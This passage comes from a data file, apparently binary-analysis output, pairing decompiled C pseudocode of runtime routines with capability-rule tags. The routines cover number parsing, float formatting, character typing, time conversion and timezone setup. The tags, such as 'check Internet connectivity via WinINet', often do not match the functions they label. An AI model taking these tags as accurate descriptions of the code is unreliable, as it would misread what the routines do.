}\ncode_r0x00422466:\n                } while (*(unaff_EBP + -0x17d) == '\\0');\n                *(unaff_EBP + -0x194) = uVar11;\n            }\n            if (*(unaff_EBP + -0x197) != '\\0') {\n                *(unaff_EBP + -0x1a0) = -*(unaff_EBP + -0x1a0);\n            }\n        }\n        else {\n            if (*(unaff_EBP + -0x17d) == '\\0') {\n                do {\n                    if ((uVar14 == 0x78) || (uVar14 == 0x70)) {\n                        iVar7 = fcn.00422f50(uVar11);\n                        if (iVar7 != 0) {\n                            uVar4 = *(unaff_EBP + -0x1ac);\n                            *(unaff_EBP + -0x1ac) = uVar4 << 4;\n                            *(unaff_EBP + -0x1a8) = *(unaff_EBP + -0x1a8) << 4 | uVar4 >> 0x1c;\n                            iVar7 = fcn.00422f16(uVar11);\n                            if (iVar7 == 0) {\n                                uVar11 = (uVar11 & 0xffffffdf) - 7;\n                            }\n                            goto code_r0x004222f3;\n                        }\ncode_r0x004222ed:\n                        *(unaff_EBP + -0x17d) = *(unaff_EBP + -0x17d) + '\\x01';\n                    }\n                    else {\n                        iVar7 = fcn.00422f16(uVar11);\n                        if (iVar7 == 0) goto code_r0x004222ed;\n                        if (uVar14 == 0x6f) {\n                            if (0x37 < uVar11) goto code_r0x004222ed;\n                            uVar4 = *(unaff_EBP + -0x1ac);\n                            *(unaff_EBP + -0x1ac) = uVar4 << 3;\n                            *(unaff_EBP + -0x1a8) = *(unaff_EBP + -0x1a8) << 3 | uVar4 >> 0x1d;\n                        }\n                        else {\n                            var_4h_2 = *(unaff_EBP + -0x1ac);\n                            uVar22 = fcn.0041cea0();\n                            *(unaff_EBP + -0x1ac) = uVar22;\n                            *(unaff_EBP + -0x1a8) = uVar22 >> 0x20;\n                        }\n                    }\ncode_r0x004222f3:\n                    if (*(unaff_EBP + -0x17d) == '\\0') {\n                        *(unaff_EBP + -0x19c) = *(unaff_EBP + -0x19c) + 1;\n                        uVar4 = uVar11 - 0x30;\n                        puVar2 = unaff_EBP + -0x1ac;\n                        uVar5 = *puVar2;\n                        *puVar2 = *puVar2 + uVar4;\n                        *(unaff_EBP + -0x1a8) = *(unaff_EBP + -0x1a8) + (uVar4 >> 0x1f) + CARRY4(uVar5, uVar4);\n                        if (*(unaff_EBP + -0x1b4) != 0) {\n                            piVar1 = unaff_EBP + -0x18c;\n                            *piVar1 = *piVar1 + -1;\n                            if (*piVar1 == 0) {\n                                *(unaff_EBP + -0x17d) = 1;\n                                goto code_r0x00422351;\n                            }\n                        }\n                        *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n                        uVar11 = fcn.0042183e();\n                    }\n                    else {\n                        *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + -1;\n                        if (uVar11 != 0xffffffff) {\n                            fcn.004248c4(uVar11, uVar9);\n                        }\n                    }\ncode_r0x00422351:\n                } while (*(unaff_EBP + -0x17d) == '\\0');\n                *(unaff_EBP + -0x194) = uVar11;\n            }\n            if (*(unaff_EBP + -0x197) != '\\0') {\n                iVar7 = *(unaff_EBP + -0x1ac);\n                *(unaff_EBP + -0x1ac) = -iVar7;\n                *(unaff_EBP + -0x1a8) = -(*(unaff_EBP + -0x1a8) + (iVar7 != 0));\n            }\n        }\n        if (uVar14 == 0x46) {\n            *(unaff_EBP + -0x19c) = 0;\n        }\n        if (*(unaff_EBP + -0x19c) != 0) {\n            if (*(unaff_EBP + -0x18e) == '\\0') {\n                *(unaff_EBP + -0x1b8) = *(unaff_EBP + -0x1b8) + 1;\n                puVar15 = *(unaff_EBP + -0x1b0);\n                uVar9 = *(unaff_EBP + -0x1a0);\ncode_r0x004224bc:\n                if (*(unaff_EBP + -0x1c8) == 0) {\n                    if (*(unaff_EBP + -0x18d) == '\\0') {\n                        *puVar15 = uVar9;\n                    }\n                    else {\n                        *puVar15 = uVar9;\n                    }\n                }\n                else {\n                    *puVar15 = *(unaff_EBP + -0x1ac);\n                    puVar15[1] = *(unaff_EBP + -0x1a8);\n                }\n            }\n            goto code_r0x004224e8;\n        }\n        goto code_r0x00422589;\n    }\n    if (uVar14 == 0x6f) goto code_r0x004221e8;\n    if (uVar14 == 99) {\n        if (iVar7 == 0) {\n            *(unaff_EBP + -0x1b4) = 1;\n            *(unaff_EBP + -0x18c) = *(unaff_EBP + -0x18c) + 1;\n        }\n        goto code_r0x00421dae;\n    }\n    if (uVar14 == 100) goto code_r0x004221e8;\n    if (uVar14 < 0x65) {\ncode_r0x00421ded:\n        if (**(unaff_EBP + 0xc) != *(unaff_EBP + -0x194)) goto code_r0x00421dfb;\n        *(unaff_EBP + -0x195) = *(unaff_EBP + -0x195) + -1;\n        if (*(unaff_EBP + -0x18e) == '\\0') {\n            *(unaff_EBP + 0x10) = *(unaff_EBP + -0x1dc);\n        }\n    }\n    else {\n        if (0x67 < uVar14) {\n            if (uVar14 == 0x69) {\n                uVar14 = 100;\n                goto code_r0x00421b75;\n            }\n            if (uVar14 != 0x6e) goto code_r0x00421ded;\n            uVar9 = *(unaff_EBP + -0x184);\n            if (*(unaff_EBP + -0x18e) != '\\0') goto code_r0x004224e8;\n            goto code_r0x004224bc;\n        }\n        pcVar18 = unaff_EBP + -0x17c;\n        iVar7 = *(unaff_EBP + -0x194);\n        if (iVar7 == 0x2d) {\n            *(unaff_EBP + -0x17c) = 0x2d;\n            pcVar18 = unaff_EBP + -0x17b;\ncode_r0x00421bb4:\n            *(unaff_EBP + -0x18c) = *(unaff_EBP + -0x18c) + -1;\n            *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n            uVar9 = *(unaff_EBP + 8);\n            iVar7 = fcn.0042183e();\n            *(unaff_EBP + -0x194) = iVar7;\n        }\n        else {\n            if (iVar7 == 0x2b) goto code_r0x00421bb4;\n            uVar9 = *(unaff_EBP + 8);\n        }\n        if ((*(unaff_EBP + -0x1b4) == 0) || (0x15d < *(unaff_EBP + -0x18c))) {\n            *(unaff_EBP + -0x18c) = 0x15d;\n        }\n        while( true ) {\n            iVar8 = fcn.00422f16(iVar7);\n            if ((iVar8 == 0) ||\n               (iVar8 = *(unaff_EBP + -0x18c),  *(unaff_EBP + -0x18c) = *(unaff_EBP + -0x18c) + -1,  iVar8 == 0)) break;\n            *(unaff_EBP + -0x19c) = *(unaff_EBP + -0x19c) + 1;\n            *pcVar18 = iVar7;\n            pcVar18 = pcVar18 + 1;\n            *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n            iVar7 = fcn.0042183e();\n            *(unaff_EBP + -0x194) = iVar7;\n        }\n        if ((*0x444cc4 == iVar7) &&\n           (iVar8 = *(unaff_EBP + -0x18c),  *(unaff_EBP + -0x18c) = *(unaff_EBP + -0x18c) + -1,  iVar8 != 0)) {\n            *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n            iVar7 = fcn.0042183e();\n            *pcVar18 = *0x444cc4;\n            while( true ) {\n                pcVar18 = pcVar18 + 1;\n                *(unaff_EBP + -0x194) = iVar7;\n                iVar8 = fcn.00422f16(iVar7);\n                if ((iVar8 == 0) ||\n                   (iVar8 = *(unaff_EBP + -0x18c),  *(unaff_EBP + -0x18c) = *(unaff_EBP + -0x18c) + -1,  iVar8 == 0))\n                break;\n                *(unaff_EBP + -0x19c) = *(unaff_EBP + -0x19c) + 1;\n                *pcVar18 = iVar7;\n                *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n                iVar7 = fcn.0042183e();\n            }\n        }\n        pcVar19 = pcVar18;\n        if ((*(unaff_EBP + -0x19c) != 0) &&\n           (((iVar7 == 0x65 || (iVar7 == 0x45)) &&\n            (iVar8 = *(unaff_EBP + -0x18c),  *(unaff_EBP + -0x18c) = *(unaff_EBP + -0x18c) + -1,  iVar8 != 0)))) {\n            *pcVar18 = 'e';\n            pcVar19 = pcVar18 + 1;\n            *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n            iVar7 = fcn.0042183e();\n            *(unaff_EBP + -0x194) = iVar7;\n            if (iVar7 == 0x2d) {\n                *pcVar19 = '-';\n                pcVar19 = pcVar18 + 2;\ncode_r0x00421cee:\n                iVar8 = *(unaff_EBP + -0x18c);\n                *(unaff_EBP + -0x18c) = *(unaff_EBP + -0x18c) + -1;\n                if (iVar8 != 0) goto code_r0x00421d1f;\n                *(unaff_EBP + -0x18c) = 0;\n            }\n            else if (iVar7 == 0x2b) goto code_r0x00421cee;\n            while ((iVar8 = fcn.00422f16(iVar7),  iVar8 != 0 &&\n                   (iVar8 = *(unaff_EBP + -0x18c),  *(unaff_EBP + -0x18c) = *(unaff_EBP + -0x18c) + -1,  iVar8 != 0))) {\n                *(unaff_EBP + -0x19c) = *(unaff_EBP + -0x19c) + 1;\n                *pcVar19 = iVar7;\n                pcVar19 = pcVar19 + 1;\ncode_r0x00421d1f:\n                *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n                iVar7 = fcn.0042183e();\n                *(unaff_EBP + -0x194) = iVar7;\n            }\n        }\n        *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + -1;\n        if (iVar7 != -1) {\n            fcn.004248c4(iVar7, uVar9);\n        }\n        if (*(unaff_EBP + -0x19c) == 0) goto code_r0x00422589;\n        if (*(unaff_EBP + -0x18e) == '\\0') {\n            *(unaff_EBP + -0x1b8) = *(unaff_EBP + -0x1b8) + 1;\n            *pcVar19 = '\\0';\n            (**0x444758)(*(unaff_EBP + -0x18d) + -1, *(unaff_EBP + -0x1b0), unaff_EBP + -0x17c);\n        }\n    }\ncode_r0x004224e8:\n    *(unaff_EBP + -0x195) = *(unaff_EBP + -0x195) + '\\x01';\n    *(unaff_EBP + 0xc) = *(unaff_EBP + 0xc) + 1;\ncode_r0x0042256a:\n    if ((*(unaff_EBP + -0x194) == -1) && ((**(unaff_EBP + 0xc) != '%' || ((*(unaff_EBP + 0xc))[1] != 'n'))))\n    goto code_r0x00422589;\n    goto code_r0x00421897;\ncode_r0x00422183:\n    *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + -1;\n    if (uVar11 != 0xffffffff) {\n        fcn.004248c4(uVar11, *(unaff_EBP + 8));\n    }\ncode_r0x00422199:\n    if (puVar20 == puVar15) goto code_r0x00422589;\n    if ((*(unaff_EBP + -0x18e) == '\\0') &&\n       (*(unaff_EBP + -0x1b8) = *(unaff_EBP + -0x1b8) + 1,  *(unaff_EBP + -0x1c0) != 99)) {\n        if (*(unaff_EBP + -0x196) == '\\0') {\n            **(unaff_EBP + -0x1b0) = 0;\n        }\n        else {\n            **(unaff_EBP + -0x1b0) = 0;\n        }\n    }\n    goto code_r0x004224e8;\n}\n",
        "token_count": 10075
    },
    "00422671": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00422671(int32_t arg_8h, int32_t *arg_ch, uint arg_10h)\n\n{\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (arg_8h != 0) {\n        fcn.00424c54(&var_8h, arg_10h);\n        *arg_ch = var_8h;\n        arg_ch[1] = var_4h;\n        return;\n    }\n    fcn.00424c91(&arg_8h, arg_10h);\n    *arg_ch = arg_8h;\n    return;\n}\n",
        "token_count": 142
    },
    "004226cc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004226cc(int32_t arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    int32_t *in_EAX;\n    uchar *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uchar *unaff_EBX;\n    \n    if (arg_10h != '\\0') {\n        fcn.004226af();\n    }\n    if (*in_EAX == 0x2d) {\n        *unaff_EBX = 0x2d;\n        unaff_EBX = unaff_EBX + 1;\n    }\n    puVar1 = unaff_EBX;\n    if (0 < arg_8h) {\n        puVar1 = unaff_EBX + 1;\n        *unaff_EBX = *puVar1;\n        *puVar1 = *0x444cc4;\n    }\n    puVar1 = fcn.00420ad0(puVar1 + arg_8h + (arg_10h == '\\0'), \"e+000\");\n    if (arg_ch != 0) {\n        *puVar1 = 0x45;\n    }\n    if (*in_EAX[3] != '0') {\n        iVar2 = in_EAX[1] + -1;\n        if (iVar2 < 0) {\n            iVar2 = -iVar2;\n            puVar1[1] = 0x2d;\n        }\n        if (99 < iVar2) {\n            iVar3 = iVar2 / 100;\n            iVar2 = iVar2 % 100;\n            puVar1[2] = puVar1[2] + iVar3;\n        }\n        if (9 < iVar2) {\n            iVar3 = iVar2 / 10;\n            iVar2 = iVar2 % 10;\n            puVar1[3] = puVar1[3] + iVar3;\n        }\n        puVar1[4] = puVar1[4] + iVar2;\n    }\n    return;\n}\n",
        "token_count": 439
    },
    "004227e6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.004227e6(uchar *arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    uchar *puVar3;\n    \n    iVar1 = in_EAX[1];\n    if ((arg_10h != '\\0') && (iVar1 + -1 == arg_ch)) {\n        iVar2 = *in_EAX;\n        arg_8h[(iVar2 == 0x2d) + iVar1 + -1] = 0x30;\n        (arg_8h + (iVar2 == 0x2d) + iVar1 + -1)[1] = 0;\n    }\n    puVar3 = arg_8h;\n    if (*in_EAX == 0x2d) {\n        *arg_8h = 0x2d;\n        puVar3 = arg_8h + 1;\n    }\n    if (in_EAX[1] < 1) {\n        fcn.004226af();\n        *puVar3 = 0x30;\n        puVar3 = puVar3 + 1;\n    }\n    else {\n        puVar3 = puVar3 + in_EAX[1];\n    }\n    if (0 < arg_ch) {\n        fcn.004226af();\n        *puVar3 = *0x444cc4;\n        iVar1 = in_EAX[1];\n        if (iVar1 < 0) {\n            if ((arg_10h != '\\0') || (SBORROW4(arg_ch, -iVar1) == arg_ch + iVar1 < 0)) {\n                arg_ch = -iVar1;\n            }\n            fcn.004226af();\n            fcn.0041cc60(puVar3 + 1, 0x30, arg_ch);\n        }\n    }\n    return arg_8h;\n}\n",
        "token_count": 424
    },
    "00422a4a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_28h_2\n// WARNING: Variable defined which should be unmapped: var_24h_2\n// WARNING: Variable defined which should be unmapped: var_20h_2\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: lpCharType\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n\nvoid __cdecl\nfcn.00422a4a(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint arg_20h_2, \n            uint noname_7, uint arg_8h, uint lpMultiByteStr, uint cbMultiByte, uint arg_14h, uint CodePage, uint arg_1ch\n            , uint arg_20h)\n\n{\n    int32_t iVar1;\n    uint *arg_8h_00;\n    uint uVar2;\n    int32_t noname_1_00;\n    int32_t unaff_EBP;\n    int32_t iVar3;\n    int32_t noname_0_00;\n    uint dwInfoType;\n    uint var_ch;\n    uint var_10h;\n    uint var_14h;\n    uint var_18h_2;\n    uint var_4h;\n    uint var_2ch;\n    uint var_28h_2;\n    uint var_24h_2;\n    uint var_20h_2;\n    int32_t lpCharType;\n    int32_t var_38h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    \n    fcn.0041cd84();\n    iVar3 = 0;\n    if (*0x449980 == 0) {\n        var_38h = 0x422a74;\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetStringTypeW)();\n        if (iVar1 == 0) {\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar1 == 0x78) {\n                *0x449980 = 2;\n            }\n        }\n        else {\n            *0x449980 = 1;\n        }\n    }\n    if ((*0x449980 == 2) || (*0x449980 == 0)) {\n        iVar1 = *(unaff_EBP + 0x1c);\n        if (*(unaff_EBP + 0x1c) == 0) {\n            iVar1 = *0x449968;\n        }\n        noname_0_00 = *(unaff_EBP + 0x18);\n        if (*(unaff_EBP + 0x18) == 0) {\n            noname_0_00 = *0x449978;\n        }\n        noname_1_00 = fcn.00423a40(iVar1);\n        if (noname_1_00 != -1) {\n            if (noname_1_00 != noname_0_00) {\n                lpCharType = noname_0_00;\n                var_38h = noname_1_00;\n                iVar3 = fcn.00423a83(noname_0_00, noname_1_00, *(unaff_EBP + 0xc), unaff_EBP + 0x10, 0, 0, 0x43b630, \n                                     0x1c);\n                if (iVar3 == 0) goto code_r0x00422bfb;\n                *(unaff_EBP + 0xc) = iVar3;\n            }\n            lpCharType = 0x422bec;\n            var_38h = iVar1;\n            (*_sym.imp.KERNEL32.dll_GetStringTypeA)();\n            if (iVar3 != 0) {\n                lpCharType = iVar3;\n                fcn.0041ba6d(iVar3);\n            }\n        }\n    }\n    else if (*0x449980 == 1) {\n        *(unaff_EBP + -0x24) = 0;\n        *(unaff_EBP + -0x20) = 0;\n        if (*(unaff_EBP + 0x18) == 0) {\n            *(unaff_EBP + 0x18) = *0x449978;\n        }\n        var_38h = (*(unaff_EBP + 0x20) != 0) * 8 + 1;\n        lpCharType = *(unaff_EBP + 0x18);\n        arg_8h_00 = &fcn.00422a4a::lpCharType;\n        iVar3 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)();\n        *(unaff_EBP + -0x28) = iVar3;\n        if (iVar3 != 0) {\n            *(unaff_EBP + -4) = 0;\n            fcn.0041bcd0();\n            *(unaff_EBP + -0x18) = &fcn.00422a4a::lpCharType;\n            *(unaff_EBP + -0x2c) = &fcn.00422a4a::lpCharType;\n            fcn.0041cc60(&fcn.00422a4a::lpCharType, 0, iVar3 * 2);\n            *(unaff_EBP + -4) = 0xffffffff;\n            if (*0x10 == 0x20) {\n                arg_8h_00 = fcn.0041df24(2, iVar3);\n                if (arg_8h_00 == NULL) goto code_r0x00422bfb;\n                *(unaff_EBP + -0x20) = 1;\n            }\n            iVar3 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                              (*(unaff_EBP + 0x18), 1, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), arg_8h_00, iVar3);\n            if (iVar3 != 0) {\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetStringTypeW)(*(unaff_EBP + 8), arg_8h_00, iVar3, *(unaff_EBP + 0x14))\n                ;\n                *(unaff_EBP + -0x24) = uVar2;\n            }\n            if (*(unaff_EBP + -0x20) != 0) {\n                fcn.0041ba6d(arg_8h_00);\n            }\n        }\n    }\ncode_r0x00422bfb:\n    *(unaff_EBP + -0x3c) = 0x422c03;\n    fcn.0041cdbf();\n    return;\n}\n",
        "token_count": 1555
    },
    "00422f16": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t fcn.00422f16(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    iVar1 = fcn.0041e005();\n    iVar1 = *(iVar1 + 100);\n    if (iVar1 != *0x4447cc) {\n        iVar1 = fcn.00422e0c();\n    }\n    if (1 < *(iVar1 + 0x28)) {\n        uVar2 = fcn.00422c04(iVar1, param_1, 4);\n        return uVar2;\n    }\n    return *(*(iVar1 + 0x48) + param_1 * 2) & 4;\n}\n",
        "token_count": 158
    },
    "00422f50": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t fcn.00422f50(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    iVar1 = fcn.0041e005();\n    iVar1 = *(iVar1 + 100);\n    if (iVar1 != *0x4447cc) {\n        iVar1 = fcn.00422e0c();\n    }\n    if (1 < *(iVar1 + 0x28)) {\n        uVar2 = fcn.00422c04(iVar1, param_1, 0x80);\n        return uVar2;\n    }\n    return *(*(iVar1 + 0x48) + param_1 * 2) & 0x80;\n}\n",
        "token_count": 162
    },
    "00422f8f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t fcn.00422f8f(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    iVar1 = fcn.0041e005();\n    iVar1 = *(iVar1 + 100);\n    if (iVar1 != *0x4447cc) {\n        iVar1 = fcn.00422e0c();\n    }\n    if (1 < *(iVar1 + 0x28)) {\n        uVar2 = fcn.00422c04(iVar1, param_1, 8);\n        return uVar2;\n    }\n    return *(*(iVar1 + 0x48) + param_1 * 2) & 8;\n}\n",
        "token_count": 159
    },
    "00423065": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00423065(int64_t *arg_8h)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    int64_t iVar7;\n    int64_t iVar8;\n    int64_t iVar9;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    bVar1 = false;\n    iVar5 = *(arg_8h + 4);\n    iVar4 = *arg_8h;\n    iVar8 = *arg_8h;\n    iVar2 = fcn.0041e005();\n    if (((iVar5 < 0) || (0x1000 < iVar5)) || ((0xfff < iVar5 && (iVar4 != 0)))) {\n        return NULL;\n    }\n    if (*(iVar2 + 0x44) == 0) {\n        iVar3 = fcn.0041ba5b(0x24);\n        *(iVar2 + 0x44) = iVar3;\n        if (iVar3 != 0) goto code_r0x004230cb;\n        piVar6 = 0x449990;\n    }\n    else {\ncode_r0x004230cb:\n        piVar6 = *(iVar2 + 0x44);\n    }\n    iVar4 = fcn.0041cee0(iVar4, iVar5, 0x1e13380, 0);\n    var_4h = iVar4 + 0x46;\n    iVar5 = iVar4 + 0x45;\n    iVar7 = fcn.0041cea0(iVar4, iVar4 >> 0x1f, 0xfffffe93, 0xffffffff);\n    iVar7 = fcn.0041cea0(iVar7 - (((iVar4 + 0x171) / 400 - iVar5 / 100) + -0x11 + iVar5 / 4), 0x15180, 0);\n    iVar7 = iVar7 + iVar8;\n    iVar2 = iVar7;\n    if ((iVar7 < 0x100000000) && (iVar7 < 0)) {\n        iVar7 = iVar7 + 0x1e13380;\n        var_4h = iVar5;\n        if (((iVar5 % 4 != 0) || (iVar5 % 100 == 0)) && ((iVar4 + 0x7b1) % 400 != 0)) goto code_r0x004231c7;\n        iVar7 = CONCAT44((iVar7 >> 0x20) + (0xfffeae7f < iVar7), iVar2 + 0x1e28500);\n    }\n    else if (((var_4h % 4 != 0) || (var_4h % 100 == 0)) && ((iVar4 + 0x7b2) % 400 != 0)) goto code_r0x004231c7;\n    bVar1 = true;\ncode_r0x004231c7:\n    piVar6[5] = var_4h;\n    iVar5 = fcn.0041cee0(iVar7, 0x15180, 0);\n    piVar6[7] = iVar5;\n    iVar8 = fcn.0041cea0(iVar5, iVar5 >> 0x1f, 0xfffeae80, 0xffffffff);\n    iVar5 = 0x4449d0;\n    if (!bVar1) {\n        iVar5 = 0x444a04;\n    }\n    iVar2 = 1;\n    iVar4 = *(iVar5 + 4);\n    while (iVar4 < piVar6[7]) {\n        iVar2 = iVar2 + 1;\n        iVar4 = *(iVar5 + iVar2 * 4);\n    }\n    piVar6[4] = iVar2 + -1;\n    piVar6[3] = piVar6[7] - *(iVar5 + (iVar2 + -1) * 4);\n    iVar5 = fcn.0041cee0(*arg_8h, *(arg_8h + 4), 0x15180, 0);\n    piVar6[6] = (iVar5 + 4) % 7;\n    iVar5 = fcn.0041cee0(iVar8 + iVar7, 0xe10, 0);\n    piVar6[2] = iVar5;\n    iVar9 = fcn.0041cea0(iVar5, iVar5 >> 0x1f, 0xfffff1f0, 0xffffffff);\n    iVar9 = iVar8 + iVar7 + iVar9;\n    iVar5 = fcn.0041cee0(iVar9, 0x3c, 0);\n    piVar6[1] = iVar5;\n    *piVar6 = iVar9 + iVar5 * -0x3c;\n    piVar6[8] = 0;\n    return piVar6;\n}\n",
        "token_count": 1121
    },
    "0042328a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_28h\n\nvoid fcn.0042328a(void)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uint uVar3;\n    char *arg_8h;\n    int32_t iVar4;\n    int32_t unaff_EBP;\n    char *pcVar5;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0041cd84(0x43bd18, 0x18);\n    *(unaff_EBP + -0x20) = 0;\n    fcn.0041f23f(7);\n    *(unaff_EBP + -4) = 0;\n    uVar3 = *0x449978;\n    *(unaff_EBP + -0x28) = *0x449978;\n    *0x449a64 = 0;\n    *0x4449c4 = 0xffffffff;\n    *0x4449b8 = 0xffffffff;\n    arg_8h = fcn.004252a4(0x43bd14);\n    *(unaff_EBP + -0x24) = arg_8h;\n    if ((arg_8h == NULL) || (*arg_8h == '\\0')) {\n        if (*0x449a68 != 0) {\n            fcn.0041ba6d(*0x449a68);\n            *0x449a68 = 0;\n        }\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetTimeZoneInformation)(0x4499b8);\n        pcVar2 = _sym.imp.KERNEL32.dll_WideCharToMultiByte;\n        if (iVar4 != -1) {\n            *0x449a64 = 1;\n            *0x444920 = *0x4499b8 * 0x3c;\n            if (*0x4499fe != 0) {\n                *0x444920 = *0x444920 + *0x449a0c * 0x3c;\n            }\n            if ((*0x449a52 == 0) || (*0x449a60 == 0)) {\n                *0x444924 = 0;\n                *0x444928 = 0;\n            }\n            else {\n                *0x444924 = 1;\n                *0x444928 = (*0x449a60 - *0x449a0c) * 0x3c;\n            }\n            iVar4 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)\n                              (uVar3, 0, 0x4499bc, 0xffffffff, *0x4449b0, 0x3f, 0, unaff_EBP + -0x1c);\n            if ((iVar4 == 0) || (*(unaff_EBP + -0x1c) != 0)) {\n                **0x4449b0 = 0;\n            }\n            else {\n                (*0x4449b0)[0x3f] = 0;\n            }\n            iVar4 = (*pcVar2)(uVar3, 0, 0x449a10, 0xffffffff, *0x4449b4, 0x3f, 0, unaff_EBP + -0x1c);\n            if ((iVar4 == 0) || (*(unaff_EBP + -0x1c) != 0)) {\n                **0x4449b4 = 0;\n            }\n            else {\n                (*0x4449b4)[0x3f] = 0;\n            }\n        }\n    }\n    else {\n        if (*0x449a68 != 0) {\n            iVar4 = fcn.0041e700(arg_8h, *0x449a68);\n            if (iVar4 == 0) goto code_r0x0042348e;\n            if (*0x449a68 != 0) {\n                fcn.0041ba6d(*0x449a68);\n            }\n        }\n        iVar4 = fcn.0041c6f0(arg_8h);\n        *0x449a68 = fcn.0041ba5b(iVar4 + 1);\n        if (*0x449a68 != 0) {\n            fcn.00420ad0(*0x449a68, arg_8h);\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.004234a5();\n            fcn.00424590(*0x4449b0, arg_8h, 3);\n            (*0x4449b0)[3] = 0;\n            pcVar5 = arg_8h + 3;\n            if (*pcVar5 == '-') {\n                *(unaff_EBP + -0x20) = 1;\n                pcVar5 = arg_8h + 4;\n            }\n            *0x444920 = fcn.0041d5fb(pcVar5);\n            *0x444920 = *0x444920 * 0xe10;\n            for (; (cVar1 = *pcVar5,  cVar1 == '+' || (('/' < cVar1 && (cVar1 < ':')))); pcVar5 = pcVar5 + 1) {\n            }\n            if (*pcVar5 == ':') {\n                pcVar5 = pcVar5 + 1;\n                iVar4 = fcn.0041d5fb(pcVar5);\n                *0x444920 = *0x444920 + iVar4 * 0x3c;\n                for (; ('/' < *pcVar5 && (*pcVar5 < ':')); pcVar5 = 